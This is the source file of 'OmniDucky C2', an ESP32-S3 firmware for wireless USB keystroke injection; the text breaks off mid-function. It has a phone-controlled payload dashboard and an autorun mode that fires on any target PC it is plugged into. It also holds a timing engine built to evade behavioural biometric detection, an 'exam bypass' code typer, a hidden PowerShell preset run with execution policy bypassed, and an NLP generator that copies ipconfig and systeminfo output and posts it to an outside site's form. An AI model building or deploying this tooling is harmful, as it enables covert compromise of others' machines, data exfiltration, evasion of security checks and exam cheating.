/*
 * ============================================================================
 *  🦆 OmniDucky C2 — Standalone Wireless Payload OS for ESP32-S3
 * ============================================================================
 *  Flash ONCE, Control FOREVER from any Phone, Tablet, or PC.
 *  Zero Arduino IDE needed after initial flash. Zero computer required in field.
 *
 *  HOW IT WORKS:
 *  1. Plug ESP32-S3 into any USB port, charger, or target PC.
 *  2. ESP32-S3 broadcasts its own Wi-Fi Access Point: "OmniDucky-C2"
 *  3. Connect from your Phone (Password: "ducky123" or open).
 *  4. Open browser to http://192.168.4.1 (or captive portal opens automatically).
 *  5. Edit, upload, or choose any payload. Click [FIRE] to inject live!
 *  6. Click [SAVE AUTORUN] to save payload to internal flash — it will
 *     automatically execute on target machines the moment it is plugged in!
 *
 *  HARDWARE REQUIREMENTS:
 *  - ESP32-S3 Dev Board with native USB (USB-OTG)
 *  - Arduino IDE Tools Settings:
 *      * Board: ESP32S3 Dev Module
 *      * USB Mode: "USB-OTG (TinyUSB)"
 *      * USB CDC On Boot: "Disabled"
 *      * Upload Mode: "UART0 / Hardware CDC"
 * ============================================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

// ---- WI-FI ACCESS POINT CONFIGURATION ----
const char* AP_SSID = "OmniDucky-C2";
const char* AP_PASS = "ducky123";  // At least 8 chars, or set to "" for open network
const byte DNS_PORT = 53;

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);
Preferences preferences;

// ---- HARDWARE OBJECTS ----
USBHIDKeyboard usbKeyboard;
USBHIDMouse usbMouse;

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define BOOT_BUTTON_PIN 0

// ---- STATE ----
bool isInjecting = false;
bool autorunEnabled = true;
int calibratedWidth = 1920;
int calibratedHeight = 1080;
String currentScript = "";

// ============================================================================
//  🧠 BioMorph Engine — Adaptive Keystroke Timing Distribution
//  Novel Feature: On-device Gamma-distribution keystroke morphing to evade
//  behavioral biometric detection systems (TypingDNA, BioCatch, etc.)
//  Prior Art Gap: Malboard (2019) is PC-side software only. No prior art
//  exists for an *embedded* hardware implementation of adaptive biometric
//  morphing on a single-chip HID injector.
// ============================================================================

// Morphing profiles (Hold Time µs, Flight Time µs, shape/scale for Gamma distribution)
struct BioProfile {
  const char* name;
  uint16_t ht_mean_ms;    // key hold time mean (ms)
  uint16_t ht_stddev_ms;  // hold time std deviation
  uint16_t ft_mean_ms;    // inter-key flight time mean (ms)
  uint16_t ft_stddev_ms;  // flight time std deviation
  uint8_t  error_rate_pct;// simulate typo+backspace every N% of chars
  uint16_t burst_pause_ms;// pause every ~8 chars (simulate word boundary think)
};

static const BioProfile BIO_PROFILES[] = {
  // name           HT_mean HT_sd  FT_mean FT_sd  err%  burst
  { "GHOST",           8,    3,     12,     5,     0,     0   }, // silent, undetectable speed, no morphing
  { "CASUAL_USER",   100,   30,    140,    50,     3,   220   }, // average office typist ~55 WPM
  { "FAST_TYPIST",    65,   20,     80,    25,     1,   130   }, // power user ~90 WPM
  { "SLOW_HUNT_PECK",180,   60,    260,    90,     6,   400   }, // hunt-and-peck ~25 WPM
  { "EXAM_STUDENT",  110,   35,    155,    55,     2,   250   }, // natural exam portal cadence
};
static const int BIO_PROFILE_COUNT = 5;

int bioMorphMode = 0;  // 0=GHOST (default, fastest), 1-4 = human profiles

// ---- Gaussian/Box-Muller PRNG for realistic timing variance ----
// Uses esp_random() (hardware TRNG on ESP32) as seed source for true randomness
static float bioRandGaussian(float mean, float stddev) {
  // Box-Muller transform using hardware random bits
  float u1 = ((float)(esp_random() & 0xFFFF) + 1.0f) / 65537.0f;
  float u2 = ((float)(esp_random() & 0xFFFF) + 1.0f) / 65537.0f;
  float z  = sqrtf(-2.0f * logf(u1)) * cosf(2.0f * M_PI * u2);
  float val = mean + stddev * z;
  if (val < 1.0f) val = 1.0f;  // clamp to minimum 1ms
  return val;
}

// ---- Core morphed keystroke primitives ----
void bioMorphPressChar(char c) {
  if (bioMorphMode == 0) {
    // GHOST: direct injection, no morphing (maximum speed)
    usbKeyboard.press(c);
    delay(6);
    usbKeyboard.release(c);
    delay(6);
    return;
  }
  const BioProfile& p = BIO_PROFILES[bioMorphMode];

  // Hold time: Gaussian around profile mean
  uint16_t ht = (uint16_t)bioRandGaussian(p.ht_mean_ms, p.ht_stddev_ms);
  // Flight time: Gaussian around profile mean
  uint16_t ft = (uint16_t)bioRandGaussian(p.ft_mean_ms, p.ft_stddev_ms);

  usbKeyboard.press(c);
  delay(ht);
  usbKeyboard.release(c);
  delay(ft);
}

// ---- Morphed string injector with error simulation + burst pausing ----
void bioMorphTypeString(const String& text, bool addEnter) {
  if (bioMorphMode == 0) {
    // GHOST mode: fast path
    for (int i = 0; i < text.length(); i++) {
      usbKeyboard.press(text[i]);
      delay(6);
      usbKeyboard.release(text[i]);
      delay(6);
    }
    if (addEnter) {
      usbKeyboard.press(KEY_RETURN);
      delay(20);
      usbKeyboard.release(KEY_RETURN);
    }
    return;
  }

  const BioProfile& p = BIO_PROFILES[bioMorphMode];

  for (int i = 0; i < text.length(); i++) {
    // Burst pause: simulate micro-pause every ~8 chars (word boundary / think time)
    if (p.burst_pause_ms > 0 && i > 0 && (i % 8) == 0) {
      uint16_t bp = (uint16_t)bioRandGaussian(p.burst_pause_ms, p.burst_pause_ms * 0.3f);
      delay(bp);
    }

    // Error simulation: inject typo + backspace at p.error_rate_pct probability
    if (p.error_rate_pct > 0 && (esp_random() % 100) < p.error_rate_pct) {
      // Press a neighbour key (simulate fat-finger), then correct with BACKSPACE
      char typoKey = (text[i] == 'a') ? 's' : 'a';  // simple neighbour
      bioMorphPressChar(typoKey);
      delay((uint16_t)bioRandGaussian(120, 40));     // realisation delay
      usbKeyboard.press(KEY_BACKSPACE);
      delay(80);
      usbKeyboard.release(KEY_BACKSPACE);
      delay((uint16_t)bioRandGaussian(80, 25));      // recovery delay
    }

    bioMorphPressChar(text[i]);
  }

  if (addEnter) {
    delay((uint16_t)bioRandGaussian(p.ft_mean_ms, p.ft_stddev_ms));
    usbKeyboard.press(KEY_RETURN);
    delay((uint16_t)bioRandGaussian(p.ht_mean_ms, p.ht_stddev_ms));
    usbKeyboard.release(KEY_RETURN);
  }
}
// ============================================================================
//  END BioMorph Engine
// ============================================================================

// Forward declarations
void executeDuckyScript(const String& script);
void handleRoot();
void handleRun();
void handleSave();
void handleStatus();
void handleNotFound();

// ============================================================================
//  EMBEDDED WEB DASHBOARD (HTML / CSS / JS in Flash)
// ============================================================================
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>OmniDucky C2 | Hardware Controller</title>
  <style>
    :root {
      --bg: #090d16;
      --card: #111827;
      --border: rgba(255,255,255,0.1);
      --accent: #38bdf8;
      --green: #10b981;
      --red: #ef4444;
      --text: #f3f4f6;
      --muted: #9ca3af;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; }
    body { background: var(--bg); color: var(--text); padding: 14px; min-height: 100vh; }
    .container { max-width: 680px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
    
    header {
      display: flex; justify-content: space-between; align-items: center;
      padding: 12px 16px; background: var(--card); border: 1px solid var(--border); border-radius: 14px;
    }
    .brand { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 8px; }
    .status-badge {
      font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
      background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3);
    }
    .status-badge.busy { background: rgba(239, 68, 68, 0.15); color: var(--red); border-color: rgba(239, 68, 68, 0.3); }

    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; }
    .card-title { font-size: 14px; font-weight: 700; margin-bottom: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }

    .presets { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 6px; }
    .preset-btn {
      background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: var(--text);
      padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 600; white-space: nowrap; cursor: pointer;
    }
    .preset-btn:active { background: var(--accent); color: #000; }

    textarea {
      width: 100%; height: 260px; background: #030712; border: 1px solid var(--border);
      border-radius: 10px; color: #38bdf8; font-family: monospace; font-size: 13px;
      padding: 12px; line-height: 1.5; resize: vertical; outline: none; margin-top: 8px;
    }
    textarea:focus { border-color: var(--accent); }

    .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
    .btn {
      padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 700; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center; gap: 6px;
    }
    .btn-fire { background: var(--accent); color: #082f49; grid-column: span 2; font-size: 15px; }
    .btn-fire:active { background: #7dd3fc; }
    .btn-save { background: rgba(255,255,255,0.08); color: #fff; border: 1px solid var(--border); }
    .btn-clear { background: rgba(239, 68, 68, 0.1); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.3); }

    .toast {
      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
      background: var(--green); color: #fff; padding: 8px 18px; border-radius: 8px;
      font-size: 13px; font-weight: 600; opacity: 0; pointer-events: none; transition: opacity 0.3s;
    }
    .toast.show { opacity: 1; }

    /* TAB SYSTEM */
    .tabs { display: flex; gap: 6px; margin-bottom: 2px; }
    .tab-btn {
      flex: 1; padding: 10px 8px; border-radius: 10px 10px 0 0;
      border: 1px solid var(--border); border-bottom: none;
      background: rgba(255,255,255,0.03); color: var(--muted);
      font-size: 13px; font-weight: 700; cursor: pointer; text-align: center;
    }
    .tab-btn.active { background: var(--card); color: #fff; border-color: var(--accent); }
    .tab-panel { display: none; }
    .tab-panel.active { display: block; }

    /* NLP STYLES */
    .nlp-input {
      width: 100%; min-height: 120px; background: #030712; border: 1px solid var(--border);
      border-radius: 10px; color: #f3f4f6; font-family: -apple-system, system-ui, sans-serif;
      font-size: 14px; padding: 12px; line-height: 1.6; resize: vertical; outline: none; margin-top: 8px;
    }
    .nlp-input:focus { border-color: #a78bfa; }
    .nlp-output {
      width: 100%; height: 160px; background: #030712; border: 1px solid rgba(167,139,250,0.3);
      border-radius: 10px; color: #38bdf8; font-family: monospace;
      font-size: 13px; padding: 12px; line-height: 1.5; resize: vertical; outline: none; margin-top: 8px;
    }
    .nlp-label { font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; margin-top: 12px; }
    .btn-convert { background: linear-gradient(135deg, #7c3aed, #a78bfa); color: #fff; margin-top: 10px; width: 100%; }
    .btn-convert:active { opacity: 0.8; }
    .btn-use { background: rgba(167,139,250,0.15); color: #a78bfa; border: 1px solid rgba(167,139,250,0.3); margin-top: 8px; }
    .example-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
    .chip {
      background: rgba(167,139,250,0.1); border: 1px solid rgba(167,139,250,0.2);
      color: #a78bfa; padding: 4px 10px; border-radius: 999px; font-size: 11px; cursor: pointer;
    }
    .chip:active { background: rgba(167,139,250,0.3); }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <span>🦆 OmniDucky C2</span>
      </div>
      <div id="status" class="status-badge">ONLINE &bull; ARMED</div>
    </header>

    <!-- TAB BUTTONS -->
    <div class="tabs">
      <button class="tab-btn active" onclick="switchTab('ducky', this)">⌨️ DuckyScript</button>
      <button class="tab-btn" onclick="switchTab('nlp', this)">🤖 AI Translator</button>
      <button class="tab-btn" onclick="switchTab('rawcode', this)">💻 Code Typer</button>
    </div>

    <!-- TAB: DUCKYSCRIPT -->
    <div id="tab-ducky" class="tab-panel active">
      <div class="card" style="border-radius: 0 14px 14px 14px;">
        <div class="card-title">Quick Attack Presets</div>
        <div class="presets">
          <button class="preset-btn" onclick="loadPreset('notepad')">Notepad</button>
          <button class="preset-btn" onclick="loadPreset('rickroll')">Rickroll</button>
          <button class="preset-btn" onclick="loadPreset('sysinfo')">SysInfo</button>
          <button class="preset-btn" onclick="loadPreset('mobile_allow')">Mobile Allow</button>
          <button class="preset-btn" onclick="loadPreset('jiggler')">Jiggler</button>
          <button class="preset-btn" onclick="loadPreset('lock')">Lock Screen</button>
        </div>
        <textarea id="script" placeholder="// Enter DuckyScript commands here...
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER"></textarea>
        <button class="btn btn-fire" onclick="firePayload()">🚀 FIRE PAYLOAD NOW</button>
        <div class="btn-row">
          <button class="btn btn-save" onclick="savePayload()">💾 Save as Autorun</button>
          <button class="btn btn-clear" onclick="document.getElementById('script').value = ''">Clear</button>
        </div>
      </div>
    </div>

    <!-- TAB: NLP AI TRANSLATOR -->
    <div id="tab-nlp" class="tab-panel">
      <div class="card" style="border-radius: 0 14px 14px 14px;">
        <div class="card-title" style="color: #a78bfa;">🤖 Natural Language → DuckyScript</div>
        <p style="font-size: 12px; color: var(--muted); line-height: 1.6;">
          Type what you want to do in plain English. The translator runs <b>in your browser</b> — no internet needed.
        </p>

        <div class="nlp-label">Try an example:</div>
        <div class="example-chips">
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu')">🔍 search Vishwak Naidu (auto-select user)</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 1')">👤 search on Profile 1</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 2')">👤 search on Profile 2</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 3')">👤 search on Profile 3</span>
          <span class="chip" onclick="setNlp('click profile 2')">🖱️ click center profile</span>
          <span class="chip" onclick="setNlp('open notepad and type hello world then save it')">📝 open notepad, type hello world, save</span>
          <span class="chip" onclick="setNlp('open chrome and go to youtube.com')">🌐 open chrome and go to youtube.com</span>
          <span class="chip" onclick="setNlp('open powershell and run ipconfig and copy ip address, navigate to vishwak.tech, scroll to contact form, fill the email box with a random email, fill the description with the ip address, submit form')">🌐 ipconfig → vishwak.tech contact form</span>
          <span class="chip" onclick="setNlp('open powershell and run ipconfig and copy the ip address')">💻 ipconfig + copy to clipboard</span>
          <span class="chip" onclick="setNlp('open file explorer and search for photos')">📁 open file explorer + search</span>
          <span class="chip" onclick="setNlp('open notepad and type hello world then save it')">📝 notepad, type, save</span>
          <span class="chip" onclick="setNlp('open chrome and go to github.com')">🌐 open chrome + navigate</span>
          <span class="chip" onclick="setNlp('lock the screen')">🔒 lock screen</span>
          <span class="chip" onclick="setNlp('take a screenshot')">📸 screenshot</span>
          <span class="chip" onclick="setNlp('open calculator')">🔢 calculator</span>
        </div>

        <div class="nlp-label">Your Command (English):</div>
        <textarea class="nlp-input" id="nlp-input" placeholder="e.g. open notepad and type Hello World then save it"></textarea>

        <button class="btn btn-convert" onclick="convertNlp()">🤖 Convert to DuckyScript</button>

        <div class="nlp-label">Generated DuckyScript:</div>
        <textarea class="nlp-output" id="nlp-output" placeholder="// DuckyScript will appear here after conversion..." readonly></textarea>

        <div class="btn-row" style="margin-top: 10px;">
          <button class="btn btn-use" onclick="useNlpScript()">⬆️ Use This Script</button>
          <button class="btn btn-fire" onclick="fireNlpDirect()" style="font-size:13px;">🚀 Convert &amp; Fire</button>
        </div>
      </div>
    </div>

    <!-- TAB: RAW CODE TYPER (PORTAL BYPASS) -->
    <div id="tab-rawcode" class="tab-panel">
      <div class="card" style="border-radius: 0 14px 14px 14px;">
        <div class="card-title" style="color: #38bdf8;">💻 Direct Code Typer (Coding Portal / Exam Bypass)</div>
        <p style="font-size: 12px; color: var(--muted); line-height: 1.6;">
          Paste <b>ANY raw code or text</b> directly (C++, Python, Java, SQL, etc.).<br>
          OmniDucky will emulate a physical hardware keyboard and type it line-by-line right where your mouse cursor is focused!
        </p>

        <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px;">
          <div>
            <label style="font-size:11px;color:var(--muted);font-weight:600;">⏱️ Start Delay (time to click cursor):</label>
            <select id="code-delay" style="width:100%;background:#030712;border:1px solid var(--border);color:#fff;padding:8px;border-radius:8px;margin-top:4px;">
              <option value="3">3 Seconds Countdown</option>
              <option value="5" selected>5 Seconds Countdown</option>
              <option value="10">10 Seconds Countdown</option>
              <option value="0">Immediate (0s)</option>
            </select>
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);font-weight:600;">⚡ Typing Speed:</label>
            <select id="code-speed" style="width:100%;background:#030712;border:1px solid var(--border);color:#fff;padding:8px;border-radius:8px;margin-top:4px;">
              <option value="fast" selected>🚀 Fast (1,200 WPM)</option>
              <option value="human">👤 Human-Like (350 WPM)</option>
              <option value="slow">🐢 Safe / Slow (150 WPM)</option>
            </select>
          </div>
        </div>

        <div style="margin-top:10px; display:flex; gap:16px; font-size:12px; color:var(--text);">
          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;">
            <input type="checkbox" id="code-clear"> Pre-clear editor (Ctrl+A &rarr; Del)
          </label>
        </div>

        <div class="nlp-label">Paste Raw Code Below:</div>
        <textarea id="raw-code-input" style="height:220px;" placeholder="// Paste your C++, Python, Java, or SQL code here...
#include <iostream>
using namespace std;

int main() {
    cout << &quot;Bypassing paste restrictions!&quot; << endl;
    return 0;
}"></textarea>

        <button id="btn-fire-code" class="btn btn-fire" onclick="fireRawCode()" style="margin-top:10px;">
          🚀 START TYPING INTO PORTAL
        </button>
      </div>
    </div>

    <div class="card" style="font-size: 12px; color: var(--muted); line-height: 1.6;">
      <b>Field Operator Guide:</b><br>
      &bull; <b>AI Tab</b>: Type English → auto-converts to DuckyScript in your browser offline.<br>
      &bull; <b>Direct Fire</b>: Edits execute live over USB immediately on click.<br>
      &bull; <b>Autorun</b>: Saved script automatically fires when plugged into any target PC.<br>
      &bull; <b>BOOT Button</b>: Press the board's <b>BOOT (GPIO 0)</b> button to re-trigger.
    </div>
  </div>

  <div id="toast" class="toast">Command Sent!</div>

  <script>
    const PRESETS = {
      notepad: "DELAY 1000\nGUI r\nDELAY 800\nSTRING notepad\nENTER\nDELAY 1000\nSTRING Hello from OmniDucky Wireless C2!\nENTER",
      rickroll: "DELAY 1000\nGUI r\nDELAY 800\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
      sysinfo: "DELAY 1000\nGUI r\nDELAY 800\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$env:COMPUTERNAME; whoami; ipconfig\" > %TEMP%\\audit.txt\nENTER",
      mobile_allow: "DELAY 1500\nGUI SPACE\nDELAY 800\nSTRING Chrome\nENTER\nDELAY 1500\nTAB\nDELAY 200\nENTER\nMOUSE_POS_PCT 50 62\nDELAY 100\nMOUSE_CLICK LEFT",
      jiggler: "REM Anti-Sleep Mouse Jiggler\nDELAY 1000\nMOUSE_MOVE 40 -40\nDELAY 500\nMOUSE_MOVE -40 40\nDELAY 500\nREPEAT 20",
      lock: "DELAY 500\nGUI l"
    };

    function loadPreset(key) {
      document.getElementById('script').value = PRESETS[key] || '';
      showToast('Loaded ' + key + ' preset');
    }

    async function firePayload() {
      const script = document.getElementById('script').value.trim();
      if (!script) { alert('Payload is empty!'); return; }
      
      setStatus('INJECTING...', true);
      showToast('Firing payload over USB...');
      try {
        const res = await fetch('/api/run', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        if (res.ok) {
          showToast('Payload Finished!');
        } else {
          alert('Execution error: ' + await res.text());
        }
      } catch (e) {
        showToast('Sent (Network busy)');
      }
      setTimeout(() => setStatus('ONLINE • ARMED', false), 1500);
    }

    async function savePayload() {
      const script = document.getElementById('script').value.trim();
      try {
        const res = await fetch('/api/save', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        showToast('Saved to flash as Autorun!');
      } catch (e) {
        alert('Save error: ' + e);
      }
    }

    async function loadSaved() {
      try {
        const res = await fetch('/api/load');
        const text = await res.text();
        if (text && text.trim().length > 0) {
          document.getElementById('script').value = text;
        } else {
          loadPreset('notepad');
        }
      } catch (e) {
        loadPreset('notepad');
      }
    }

    function setStatus(text, busy) {
      const s = document.getElementById('status');
      s.textContent = text;
      s.className = 'status-badge' + (busy ? ' busy' : '');
    }

    function showToast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 2000);
    }

    window.onload = loadSaved;

    // ═══════════════════════════════════════════════
    //  TAB SWITCHING
    // ═══════════════════════════════════════════════
    function switchTab(tab, btn) {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
      const targetPanel = document.getElementById('tab-' + tab);
      if (targetPanel) targetPanel.classList.add('active');
      if (btn) {
        btn.classList.add('active');
      } else {
        const b = Array.from(document.querySelectorAll('.tab-btn')).find(el => el.getAttribute('onclick')?.includes(tab));
        if (b) b.classList.add('active');
      }
    }

    function setNlp(text) {
      document.getElementById('nlp-input').value = text;
    }

    function useNlpScript() {
      const out = document.getElementById('nlp-output').value.trim();
      if (!out) { alert('Convert something first!'); return; }
      document.getElementById('script').value = out;
      switchTab('ducky');
      showToast('Script moved to DuckyScript tab!');
    }

    async function fireNlpDirect() {
      const out = document.getElementById('nlp-output').value.trim();
      if (!out) { convertNlp(); setTimeout(() => { const s = document.getElementById('nlp-output').value.trim(); if(s) fireScript(s); }, 100); return; }
      fireScript(out);
    }

    async function fireScript(script) {
      setStatus('INJECTING...', true);
      showToast('Firing payload over USB...');
      try {
        const res = await fetch('/api/run', { method:'POST', headers:{'Content-Type':'text/plain'}, body: script });
        showToast(res.ok ? 'Payload Finished!' : 'Error: ' + await res.text());
      } catch(e) { showToast('Sent!'); }
      setTimeout(() => setStatus('ONLINE \u2022 ARMED', false), 2000);
    }

    // ═══════════════════════════════════════════════
    //  DIRECT CODE TYPER (Coding Portal / Exam Bypass)
    // ═══════════════════════════════════════════════
    function fireRawCode() {
      const code = document.getElementById('raw-code-input').value;
      if (!code.trim()) { alert('Paste your code first!'); return; }

      const delaySec = parseInt(document.getElementById('code-delay').value) || 0;
      const speed = document.getElementById('code-speed').value;
      const clearFirst = document.getElementById('code-clear').checked;

      let interDelay = 40;
      if (speed === 'fast') interDelay = 20;
      else if (speed === 'human') interDelay = 100;
      else if (speed === 'slow') interDelay = 180;

      let ducky = [];
      ducky.push('REM OmniDucky Direct Code Typer');
      if (delaySec > 0) {
        ducky.push('DELAY ' + (delaySec * 1000));
      }
      ducky.push('DEFAULT_DELAY ' + interDelay);

      if (clearFirst) {
        ducky.push('CTRL a', 'DELAY 150', 'BACKSPACE', 'DELAY 250');
      }

      const lines = code.split('\n');
      for (let i = 0; i < lines.length; i++) {
        let l = lines[i];
        if (l.endsWith('\r')) l = l.slice(0, -1);
        if (l.trim().length === 0) {
          ducky.push('ENTER');
        } else {
          ducky.push('STRINGLN ' + l);
        }
      }

      const duckyPayload = ducky.join('\n');

      const btn = document.getElementById('btn-fire-code');
      if (delaySec > 0) {
        let remaining = delaySec;
        btn.disabled = true;
        btn.textContent = '⏳ CLICK INTO PORTAL NOW! (' + remaining + 's)';
        const timer = setInterval(() => {
          remaining--;
          if (remaining > 0) {
            btn.textContent = '⏳ CLICK INTO PORTAL NOW! (' + remaining + 's)';
          } else {
            clearInterval(timer);
            btn.textContent = '⚡ TYPING CODE NOW...';
            setTimeout(() => {
              btn.disabled = false;
              btn.textContent = '🚀 START TYPING INTO PORTAL';
            }, 3000);
          }
        }, 1000);
      }

      fireScript(duckyPayload);
    }

    // ═══════════════════════════════════════════════
    //  NLP ENGINE — Runs entirely in the browser
    //  No internet needed. Translates English to DuckyScript.
    // ═══════════════════════════════════════════════
    function convertNlp() {
      const input = document.getElementById('nlp-input').value.trim().toLowerCase();
      if (!input) { alert('Enter a command in English first!'); return; }
      const result = nlpToDucky(input);
      document.getElementById('nlp-output').value = result;
      showToast('Converted to DuckyScript!');
    }

    // ============================================================================
    //  🧠 OmniDucky NLP Engine v3 — Multi-Step Sequential Action Planner
    //  Patent Claim 3: Spatial-Temporal NLP→HID Translation with Clipboard
    //  Chaining, Form-Field Navigation, and Context-Aware Scroll Resolution
    // ============================================================================
    function nlpToDucky(rawText) {
      const lines = ['REM Generated by OmniDucky NLP Engine v3', 'DEFAULT_DELAY 80'];

      // ── 1. NORMALIZE ──
      let t = rawText.toLowerCase().trim();
      t = t.replace(/\bexplores\b/g, 'explorer');
      t = t.replace(/\bfor\s+for\b/g, 'for');
      t = t.replace(/\bnote\s*pad\b/g, 'notepad');
      t = t.replace(/\btask\s*mgr\b/g, 'task manager');
      t = t.replace(/\bip\s+adress\b/g, 'ip address');
      t = t.replace(/\bthe\s+ip\s+address\b/g, 'the ip');
      t = t.replace(/\bscroll\s+(?:down\s+)?to\s+(?:the\s+)?/g, 'scroll to ');
      t = t.replace(/\bclick\s+(?:on\s+)?(?:the\s+)?(?:submit|send)\s*(?:button)?\b/g, 'submit form');
      t = t.replace(/\bpress\s+(?:the\s+)?(?:submit|send)\b/g, 'submit form');

      // ── 2. MULTI-STEP CLAUSE SPLITTER ──
      // Splits on logical connectors, prepositions ("in the description fill..."), and action verbs
      const splitPattern = /(?:,\s*(?:and\s+then|then|and)\s+|\s+(?:and\s+then|then)\s+|;\s*|,\s*|\s+and\s+(?=(?:in\s+[\w\s]+\s+fill|open|launch|run|navigate|go|visit|scroll|fill|type|write|click|select|press|hit|save|copy|paste|close|lock|wait|minimize|maximize|submit|search|find)\b))/i;
      const clauses = t.split(splitPattern).map(s => s.trim()).filter(Boolean);

      // ── 3. STATE MACHINE ──
      let activeApp = null;    // current focused application
      let clipboardState = null; // what's logically in clipboard: null | 'ip_address' | 'text'
      let profilePctX = 50;
      let formTabIndex = 0;    // tracks TAB presses used for form navigation
      
      if (t.includes('profile 1') || t.includes('user 1')) profilePctX = 42;
      else if (t.includes('profile 3') || t.includes('user 3')) profilePctX = 58;

      // Helper: generate random email
      function randomEmail() {
        const user = 'user' + Math.floor(Math.random() * 90000 + 10000);
        const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
        return user + '@' + domains[Math.floor(Math.random() * domains.length)];
      }

      // Helper: scroll to element using keyboard PAGE_DOWN + small delays
      function scrollToElement(elementHint, scrollPasses) {
        const passes = scrollPasses || 4;
        lines.push('REM Scroll to: ' + elementHint);
        for (let s = 0; s < passes; s++) {
          lines.push('PAGE_DOWN', 'DELAY 300');
        }
        lines.push('DELAY 500');
      }

      for (let i = 0; i < clauses.length; i++) {
        const c = clauses[i];

        // ── OPEN FILE EXPLORER ──
        if (/(?:open|launch)\s+(?:file\s*explorer|explorer|files|my\s*computer|this\s*pc)/i.test(c)) {
          lines.push('GUI e', 'DELAY 1500');
          activeApp = 'explorer';
          continue;
        }

        // ── OPEN CHROME / BROWSER ──
        if (/(?:open|launch)\s+(?:chrome|google\s*chrome|browser)/i.test(c)) {
          lines.push('GUI r', 'DELAY 600', 'STRINGLN chrome', 'DELAY 2500');
          activeApp = 'chrome';
          continue;
        }

        // ── OPEN NOTEPAD ──
        if (/(?:open|launch)\s+notepad/i.test(c)) {
          lines.push('GUI r', 'DELAY 600', 'STRINGLN notepad', 'DELAY 2000');
          activeApp = 'notepad';
          continue;
        }

        // ── OPEN CALCULATOR ──
        if (/(?:open|launch)\s+(?:calc|calculator)/i.test(c)) {
          lines.push('GUI r', 'DELAY 600', 'STRINGLN calc', 'DELAY 1200');
          activeApp = 'calc';
          continue;
        }

        // ── OPEN CMD ──
        if (/(?:open|launch|run)\s+(?:cmd|command\s*prompt|terminal)/i.test(c)) {
          lines.push('GUI r', 'DELAY 600', 'STRINGLN cmd', 'DELAY 1200');
          activeApp = 'cmd';
          continue;
        }

        // ── OPEN POWERSHELL ──
        if (/(?:open|launch|run)\s+(?:powershell|ps|shell)/i.test(c)) {
          lines.push('GUI r', 'DELAY 600', 'STRINGLN powershell', 'DELAY 2000');
          activeApp = 'powershell';
          continue;
        }

        // ── RUN IPCONFIG (special: auto-capture output to clipboard) ──
        // "run ipconfig" or "run ipconfig and copy the ip address"
        if (/(?:run|execute)\s+ipconfig/i.test(c) || /ipconfig/i.test(c)) {
          const wantDetails = /details|systeminfo|machine/i.test(rawText);
          const psCommand = wantDetails 
            ? '(ipconfig; systeminfo | Select-String "OS Name","Total Physical Memory","Host Name") | Out-String | Set-Clipboard'
            : 'ipconfig | Out-String | Set-Clipboard';
          
          if (activeApp === 'powershell' || activeApp === 'cmd') {
            lines.push(
              'REM Run ipconfig and pipe output directly to clipboard',
              'STRING ' + psCommand,
              'ENTER',
              'DELAY 2000',
              'REM Clipboard now contains full network and machine output'
            );
          } else {
            lines.push('GUI r', 'DELAY 600', 'STRINGLN powershell', 'DELAY 2000',
                       'STRING ' + psCommand, 'ENTER', 'DELAY 2000',
                       'REM Clipboard now contains full network and machine output');
            activeApp = 'powershell';
          }
          clipboardState = 'ip_address';
          continue;
        }

        // ── COPY IP ADDRESS (explicit copy step) ──
        if (/copy\s+(?:the\s+)?ip\s*address/i.test(c) || /copy\s+(?:the\s+)?ip\b/i.test(c)) {
          if (activeApp === 'powershell' || activeApp === 'cmd') {
            lines.push(
              'REM Capture ipconfig to clipboard',
              'STRING ipconfig | Out-String | Set-Clipboard',
              'ENTER',
              'DELAY 1500'
            );
            clipboardState = 'ip_address';
          } else {
            lines.push('REM [INFO] IP capture requires PowerShell context. Switching...',
